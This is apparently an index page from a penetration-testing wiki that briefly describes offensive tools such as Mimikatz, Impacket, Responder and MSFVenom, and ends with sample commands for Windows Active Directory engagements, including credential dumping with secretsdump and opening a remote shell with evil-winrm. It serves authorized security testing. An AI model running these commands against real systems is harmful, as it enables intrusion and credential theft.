# Tools

Quick-reference pages for the core offensive security toolkit. For protocol-specific enumeration commands, see the [Services](../information-gathering/index.md) section.

---

## When to Use What

| Tool | Primary use |
|---|---|
| [BloodHound](bloodhound.md) | Map AD attack paths — run this immediately after getting domain credentials |
| [NetExec](netexec.md) | Credential validation, SMB/WinRM/LDAP enumeration, lateral movement |
| [Impacket](impacket.md) | Protocol-level attacks — secretsdump, psexec, wmiexec, Kerberos ops |
| [Mimikatz](mimikatz.md) | Credential dumping from LSASS, ticket manipulation, DCSync |
| [Metasploit](metasploit.md) | Exploit modules, meterpreter sessions, post-exploitation modules |
| [MSFVenom](msfvenom.md) | Payload generation for any platform and format |
| [Responder](responder.md) | LLMNR/NBT-NS poisoning — capture NTLMv2 hashes passively |
| [Kerbrute](kerbrute.md) | Kerberos user enumeration and password spraying without lockout |
| [ldapsearch](ldapsearch.md) | Manual LDAP queries for users, groups, computers, and policy |
| [rpcclient](rpcclient.md) | SMB/RPC enumeration — user list, SID resolution, null sessions |
| [WMIExec](wmiexec.md) | Stealthy remote command execution via WMI (no service creation) |
| [Nuclei](nuclei.md) | Template-based vulnerability scanning for known CVEs and misconfigs |
| [Burp Suite](burp-suite.md) | Web proxy — intercept, replay, and fuzz HTTP requests |
| [Nikto](nikto.md) | Web server misconfiguration and vulnerability scanning |
| [cadaver](cadaver.md) | WebDAV client — upload shells to DAV-enabled web servers |
| [Password Cracking](password-cracking.md) | Hashcat modes, rules, masks, CeWL wordlist generation |
| [Metasploit Resource Scripts](metasploit-resource-scripts.md) | Automate repetitive msfconsole workflows with `.rc` files |
| [Command-Line Shells](command-line-shells.md) | Shell variables, searchsploit, terminal shortcuts |

---

## Core Toolkit for Windows/AD Engagements

If you're going into an internal Windows or AD engagement, have these ready:

```bash
# Validate the first set of creds
nxc smb 10.10.10.0/24 -u <user> -p '<pass>'

# Dump AD data for BloodHound
bloodhound-python -c all -d example.com -u <user> -p '<pass>' -ns 10.10.10.10 --zip

# Dump credentials if you have admin
impacket-secretsdump CORP/<user>:'<pass>'@10.10.10.10

# Interactive shell
evil-winrm -i 10.10.10.10 -u <user> -p '<pass>'
```
